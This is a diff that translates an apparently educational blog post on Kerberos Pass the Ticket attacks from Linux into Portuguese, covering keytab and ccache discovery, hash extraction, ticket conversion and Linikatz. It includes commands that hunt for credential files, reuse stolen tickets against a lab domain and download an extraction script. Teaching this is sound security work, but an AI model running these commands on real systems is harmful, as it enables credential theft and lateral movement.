@@ -1,72 +1,72 @@
 ---
-title: "Pass the Ticket (PtT) from Linux"
+title: "Pass the Ticket (PtT) a partir do Linux"
 date: 2026-08-06 10:00:00 -0300
-categories: [Concepts, Linux]
+categories: [Conceitos, Linux]
 tags: [linux, kerberos, pass-the-ticket, overpass-the-hash, keytab, ccache, impacket, evil-winrm, linikatz]
 ---
 
-Linux systems joined to **Active Directory** commonly use **Kerberos** for centralized authentication, allowing users to access both Linux and Windows resources with a single identity. If such a system is compromised, attackers may search for stored Kerberos tickets in different locations to impersonate users and perform **Pass the Ticket (PtT)** attacks.
+Sistemas Linux integrados ao **Active Directory** costumam usar **Kerberos** para autenticação centralizada, permitindo que usuários acessem recursos tanto Linux quanto Windows com uma única identidade. Se um sistema desses for comprometido, atacantes podem procurar por tickets Kerberos armazenados em diferentes locais para se passar por usuários e realizar ataques de **Pass the Ticket (PtT)**.
 
-Linux and Windows use the same Kerberos authentication process, but they differ in how Kerberos tickets are stored. On most Linux systems, Kerberos tickets are saved as **ccache** files, typically in the `/tmp` directory, with their location referenced by the `KRB5CCNAME` environment variable. Users with elevated or root privileges can access these ticket files and potentially use them in **Pass the Ticket (PtT)** attacks. Linux systems may also use **keytab** files, which store Kerberos principals and encrypted keys to enable passwordless authentication. Keytab files are commonly used by automated scripts and services to authenticate to Kerberos-protected resources without requiring user interaction.
+Linux e Windows usam o mesmo processo de autenticação Kerberos, mas diferem em como os tickets Kerberos são armazenados. Na maioria dos sistemas Linux, os tickets Kerberos são salvos como arquivos **ccache**, geralmente no diretório `/tmp`, com sua localização referenciada pela variável de ambiente `KRB5CCNAME`. Usuários com privilégios elevados ou root podem acessar esses arquivos de ticket e potencialmente usá-los em ataques de **Pass the Ticket (PtT)**. Sistemas Linux também podem usar arquivos **keytab**, que armazenam principals do Kerberos e chaves criptografadas para permitir autenticação sem senha. Arquivos keytab são comumente usados por scripts e serviços automatizados para se autenticar em recursos protegidos pelo Kerberos sem exigir interação do usuário.
 
-The `realm list` command can be used to determine whether a Linux system is joined to an **Active Directory** domain and to display Kerberos configuration details, including the domain name and permitted users or groups. If the `realm` tool is unavailable, the presence of services such as **SSSD** or **Winbind** can also indicate Active Directory integration. Identifying a domain-joined Linux system is an important step when assessing Kerberos authentication and potential **Pass the Ticket (PtT)** opportunities.
+O comando `realm list` pode ser usado para determinar se um sistema Linux está integrado a um domínio do **Active Directory** e para exibir detalhes da configuração Kerberos, incluindo o nome do domínio e usuários ou grupos permitidos. Se a ferramenta `realm` não estiver disponível, a presença de serviços como **SSSD** ou **Winbind** também pode indicar integração com o Active Directory. Identificar um sistema Linux integrado ao domínio é um passo importante ao avaliar a autenticação Kerberos e possíveis oportunidades de **Pass the Ticket (PtT)**.
 
 ```bash
 realm list
 ps -ef | grep -i "winbind\|sssd"
 ```
 
-## Finding Keytab Files
+## Encontrando Arquivos Keytab
 
-Keytab files can often be discovered by searching the filesystem for filenames containing **`keytab`**, as administrators commonly use the `.keytab` extension for Kerberos authentication files. These files require appropriate read permissions to be used and may also be referenced in automated scripts, such as **cron jobs**, where commands like `kinit` authenticate service accounts without requiring a plaintext password. Analyzing these scripts can reveal both the location of keytab files and the identities of the accounts they authenticate.
+Arquivos keytab geralmente podem ser encontrados buscando no sistema de arquivos por nomes contendo **`keytab`**, já que administradores costumam usar a extensão `.keytab` para arquivos de autenticação Kerberos. Esses arquivos exigem permissões de leitura adequadas para serem usados e também podem ser referenciados em scripts automatizados, como **cron jobs**, onde comandos como `kinit` autenticam contas de serviço sem exigir uma senha em texto plano. Analisar esses scripts pode revelar tanto a localização dos arquivos keytab quanto a identidade das contas que eles autenticam.
 
 ```bash
 find / -name *keytab* -ls 2>/dev/null
 crontab -l
 ```
 
-Once a valid keytab is obtained, it can be imported into the current session with `kinit` to request a **Ticket Granting Ticket (TGT)** and impersonate the associated user or service account. In addition to user and service account keytabs, Linux domain-joined systems maintain a machine account keytab at **`/etc/krb5.keytab`**, which is typically accessible only by the root user. If this file is compromised, an attacker can authenticate as the computer account and interact with Active Directory using its identity.
+Assim que um keytab válido é obtido, ele pode ser importado na sessão atual com o `kinit` para solicitar um **Ticket Granting Ticket (TGT)** e se passar pelo usuário ou conta de serviço associada. Além de keytabs de usuário e de conta de serviço, sistemas Linux integrados ao domínio mantêm um keytab de conta de computador em **`/etc/krb5.keytab`**, que geralmente só é acessível pelo usuário root. Se esse arquivo for comprometido, um atacante pode se autenticar como a conta de computador e interagir com o Active Directory usando sua identidade.
 
-## Abusing Keytab Files
+## Abusando de Arquivos Keytab
 
-A **keytab** file can be used to impersonate the account it was created for by requesting Kerberos tickets without knowing the account's password. The `klist -k` command identifies the principal stored in the keytab, while `kinit -k -t <keytab>` loads the keytab and requests a **Ticket Granting Ticket (TGT)** for that account. After authentication, `klist` can be used to verify that the current Kerberos ticket now belongs to the impersonated user.
+Um arquivo **keytab** pode ser usado para se passar pela conta para a qual foi criado, solicitando tickets Kerberos sem saber a senha da conta. O comando `klist -k` identifica o principal armazenado no keytab, enquanto `kinit -k -t <keytab>` carrega o keytab e solicita um **Ticket Granting Ticket (TGT)** para aquela conta. Após a autenticação, o `klist` pode ser usado para verificar que o ticket Kerberos atual agora pertence ao usuário personificado.
 
-Once the ticket is loaded, Kerberos-aware tools such as `smbclient` can authenticate automatically, allowing access to resources authorized for the impersonated account, such as SMB shares. Since `kinit` replaces the current Kerberos credentials in the active session, it is recommended to back up the existing **ccache** file referenced by the `KRB5CCNAME` environment variable before importing a new keytab, preserving the original authentication context.
+Assim que o ticket é carregado, ferramentas compatíveis com Kerberos, como o `smbclient`, conseguem se autenticar automaticamente, permitindo acesso aos recursos autorizados para a conta personificada, como compartilhamentos SMB. Como o `kinit` substitui as credenciais Kerberos atuais na sessão ativa, é recomendável fazer backup do arquivo **ccache** existente referenciado pela variável de ambiente `KRB5CCNAME` antes de importar um novo keytab, preservando o contexto de autenticação original.
 
-## Keytab Extraction
+## Extração de Keytab
 
-Besides impersonating users, **keytab** files can also be used to extract Kerberos authentication secrets. Tools such as [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) parse a keytab file and recover valuable information, including the Kerberos realm, service principal, and authentication material such as **NTLM**, **AES-128**, and **AES-256** hashes. These extracted credentials can then be leveraged for further attacks.
+Além de personificar usuários, arquivos **keytab** também podem ser usados para extrair segredos de autenticação Kerberos. Ferramentas como o [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) analisam um arquivo keytab e recuperam informações valiosas, incluindo o realm Kerberos, o service principal e material de autenticação como hashes **NTLM**, **AES-128** e **AES-256**. Essas credenciais extraídas podem então ser aproveitadas para ataques subsequentes.
 
 ```bash
 python3 /opt/keytabextract.py /opt/specialfiles/<USER>.keytab
 ```
 
-The recovered **NTLM** hash can be used directly in **Pass the Hash (PtH)** attacks, while the **AES** keys can be used for **OverPass the Hash (Pass the Key)** attacks or cracked to recover the plaintext password. A single keytab file may contain multiple credentials and different encryption types, potentially belonging to multiple accounts. Password recovery can be attempted with tools such as **Hashcat** or **John the Ripper**, or by checking online password databases if appropriate, like [CrackStation](https://crackstation.net/).
+O hash **NTLM** recuperado pode ser usado diretamente em ataques de **Pass the Hash (PtH)**, enquanto as chaves **AES** podem ser usadas para ataques de **OverPass the Hash (Pass the Key)** ou quebradas para recuperar a senha em texto plano. Um único arquivo keytab pode conter múltiplas credenciais e diferentes tipos de criptografia, possivelmente pertencentes a várias contas. A recuperação de senha pode ser tentada com ferramentas como **Hashcat** ou **John the Ripper**, ou verificando bancos de dados de senha online quando apropriado, como o [CrackStation](https://crackstation.net/).
 
-Once the plaintext password is recovered, the attacker can authenticate directly as the compromised user and obtain a valid Kerberos session. This process can be repeated with additional keytab files, such as those referenced in scheduled tasks or cron jobs, enabling attackers to compromise service accounts and continue escalating privileges or moving laterally throughout the Active Directory environment.
+Assim que a senha em texto plano é recuperada, o atacante pode se autenticar diretamente como o usuário comprometido e obter uma sessão Kerberos válida. Esse processo pode ser repetido com arquivos keytab adicionais, como os referenciados em tarefas agendadas ou cron jobs, permitindo que atacantes comprometam contas de serviço e continuem escalando privilégios ou se movendo lateralmente por todo o ambiente de Active Directory.
 
-## Finding ccache Files
+## Encontrando Arquivos ccache
 
-A **ccache** file stores a user's valid Kerberos tickets after authentication and is typically referenced by the `KRB5CCNAME` environment variable, which Kerberos-enabled tools use to locate the credential cache. On most Linux systems, these files are stored in the **`/tmp`** directory and remain valid for the duration of the user's session.
+Um arquivo **ccache** armazena os tickets Kerberos válidos de um usuário após a autenticação e geralmente é referenciado pela variável de ambiente `KRB5CCNAME`, que ferramentas compatíveis com Kerberos usam para localizar o cache de credenciais. Na maioria dos sistemas Linux, esses arquivos ficam armazenados no diretório **`/tmp`** e permanecem válidos durante toda a sessão do usuário.
 
 ```bash
 env | grep -i krb5
 ls -la /tmp | grep krb
 ```
 
-By inspecting environment variables or searching the `/tmp` directory, attackers can identify active ccache files belonging to logged-in users. If an attacker gains root or other privileged access, they can reuse these valid Kerberos tickets to impersonate users and perform **Pass the Ticket (PtT)** attacks without needing the users' passwords.
+Ao inspecionar variáveis de ambiente ou buscar no diretório `/tmp`, atacantes conseguem identificar arquivos ccache ativos pertencentes a usuários logados. Se um atacante obtiver acesso root ou outro acesso privilegiado, ele pode reutilizar esses tickets Kerberos válidos para se passar por usuários e realizar ataques de **Pass the Ticket (PtT)** sem precisar das senhas dos usuários.
 
-## Abusing ccache Files
+## Abusando de Arquivos ccache
 
-A **ccache** file can be abused whenever an attacker has read access to it, which typically requires **root** or equivalent privileges on a Linux system. After gaining elevated privileges, an attacker can enumerate the **`/tmp`** directory to identify active Kerberos credential caches, determine their owners, and inspect group memberships to identify high-value targets such as **Domain Admins**. Once a valuable ccache file is found, it can be copied and loaded into the current session by setting the `KRB5CCNAME` environment variable, allowing Kerberos-enabled tools to authenticate as the ticket's owner.
+Um arquivo **ccache** pode ser abusado sempre que um atacante tiver acesso de leitura a ele, o que geralmente exige privilégios de **root** ou equivalentes num sistema Linux. Depois de obter privilégios elevados, um atacante pode enumerar o diretório **`/tmp`** para identificar caches de credenciais Kerberos ativos, determinar seus donos e inspecionar associações de grupo para identificar alvos de alto valor, como **Domain Admins**. Assim que um arquivo ccache valioso é encontrado, ele pode ser copiado e carregado na sessão atual definindo a variável de ambiente `KRB5CCNAME`, permitindo que ferramentas compatíveis com Kerberos se autentiquem como o dono do ticket.
 
-After importing the ccache, tools such as `klist` can verify the loaded ticket and confirm its validity period before use. If the ticket is still valid, the attacker can access Kerberos-protected resources, such as SMB shares, without knowing the user's password, effectively performing a **Pass the Ticket (PtT)** attack. Because ccache files are temporary and expire when their associated Kerberos tickets become invalid or users log out, attackers must verify the ticket's expiration time before relying on it for authentication.
+Depois de importar o ccache, ferramentas como o `klist` podem verificar o ticket carregado e confirmar seu período de validade antes do uso. Se o ticket ainda for válido, o atacante pode acessar recursos protegidos pelo Kerberos, como compartilhamentos SMB, sem saber a senha do usuário, realizando efetivamente um ataque de **Pass the Ticket (PtT)**. Como arquivos ccache são temporários e expiram quando seus tickets Kerberos associados se tornam inválidos ou os usuários fazem logout, atacantes precisam verificar o horário de expiração do ticket antes de confiar nele para autenticação.
 
-## Using Linux Attack Tools with Kerberos
+## Usando Ferramentas de Ataque Linux com Kerberos
 
-Many Linux offensive tools, such as **Impacket** and [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), support Kerberos authentication through existing Kerberos tickets. When running these tools from a domain-joined Linux machine, the `KRB5CCNAME` environment variable must point to the desired **ccache** file so the tools can authenticate using the stored ticket. If the attack host is **not** joined to the domain, it must still be able to communicate with the **KDC (Domain Controller)** and resolve domain hostnames correctly.
+Muitas ferramentas ofensivas de Linux, como o **Impacket** e o [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), suportam autenticação Kerberos através de tickets Kerberos existentes. Ao executar essas ferramentas a partir de uma máquina Linux integrada ao domínio, a variável de ambiente `KRB5CCNAME` precisa apontar para o arquivo **ccache** desejado, para que as ferramentas consigam se autenticar usando o ticket armazenado. Se a máquina de ataque **não** estiver integrada ao domínio, ela ainda precisa conseguir se comunicar com o **KDC (Domain Controller)** e resolver corretamente os hostnames do domínio.
 
-In environments where direct connectivity to the KDC is unavailable, attackers can tunnel traffic through a compromised host using [Chisel](https://github.com/jpillora/chisel) and route Kerberos traffic with [Proxychains](https://github.com/haad/proxychains). Additionally, the `/etc/hosts` file can be modified to manually resolve domain names and domain controllers. After importing a valid **ccache** file and configuring `KRB5CCNAME`, Kerberos-aware tools such as Impacket and Evil-WinRM can authenticate without requiring the user's password.
+Em ambientes onde a conectividade direta com o KDC não está disponível, atacantes podem tunelar o tráfego através de um host comprometido usando o [Chisel](https://github.com/jpillora/chisel) e rotear o tráfego Kerberos com o [Proxychains](https://github.com/haad/proxychains). Além disso, o arquivo `/etc/hosts` pode ser modificado para resolver manualmente nomes de domínio e controladores de domínio. Depois de importar um arquivo **ccache** válido e configurar o `KRB5CCNAME`, ferramentas compatíveis com Kerberos como o Impacket e o Evil-WinRM conseguem se autenticar sem precisar da senha do usuário.
 
 ```bash
 export KRB5CCNAME=/home/user/<CCACHE_FILE>
@@ -79,9 +79,9 @@ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 
 ### Impacket Ticket Converter
 
-**Impacket** includes the `ticketConverter` utility, which converts Kerberos tickets between the Linux **ccache** format and the Windows **.kirbi** format. This allows Kerberos tickets captured on one operating system to be reused on the other, making it easier to perform **Pass the Ticket (PtT)** attacks across different platforms.
+O **Impacket** inclui o utilitário `ticketConverter`, que converte tickets Kerberos entre o formato **ccache** do Linux e o formato **.kirbi** do Windows. Isso permite que tickets Kerberos capturados num sistema operacional sejam reutilizados no outro, facilitando ataques de **Pass the Ticket (PtT)** entre plataformas diferentes.
 
-After converting a ticket to the appropriate format, it can be imported into the target operating system using native tools. For example, a **.kirbi** ticket can be injected into a Windows session with **Rubeus**, after which the ticket becomes immediately available for Kerberos authentication.
+Depois de converter um ticket para o formato apropriado, ele pode ser importado no sistema operacional alvo usando ferramentas nativas. Por exemplo, um ticket **.kirbi** pode ser injetado numa sessão Windows com o **Rubeus**, e a partir daí o ticket fica imediatamente disponível para autenticação Kerberos.
 
 ```bash
 impacket-ticketConverter <CCACHE_FILE> <USER>.kirbi
@@ -93,9 +93,9 @@ Rubeus.exe ptt /ticket:c:\tools\<USER>.kirbi
 
 ### Linikatz
 
-[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a post-exploitation tool for Linux that performs a role similar to **Mimikatz** on Windows, targeting systems integrated with **Active Directory**. It requires **root privileges** and extracts Kerberos credentials, keytabs, cached tickets, machine account secrets, and other authentication artifacts from implementations such as **SSSD**, **Samba**, and **FreeIPA**.
+O [Linikatz](https://github.com/CiscoCXSecurity/linikatz) é uma ferramenta de pós-exploração para Linux que desempenha um papel parecido com o do **Mimikatz** no Windows, mirando sistemas integrados ao **Active Directory**. Ele requer **privilégios de root** e extrai credenciais Kerberos, keytabs, tickets em cache, segredos de conta de computador e outros artefatos de autenticação de implementações como **SSSD**, **Samba** e **FreeIPA**.
 
-The extracted credentials are organized into output files, including **ccache** and **keytab** formats, which can then be reused in attacks such as **Pass the Ticket (PtT)**, **Pass the Key (OverPass the Hash)**, or impersonation with `kinit`. This makes Linikatz a valuable tool for collecting Kerberos credentials from compromised Linux systems.
+As credenciais extraídas são organizadas em arquivos de saída, incluindo os formatos **ccache** e **keytab**, que podem então ser reutilizados em ataques como **Pass the Ticket (PtT)**, **Pass the Key (OverPass the Hash)**, ou personificação com o `kinit`. Isso torna o Linikatz uma ferramenta valiosa para coletar credenciais Kerberos de sistemas Linux comprometidos.
 
 ```bash
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
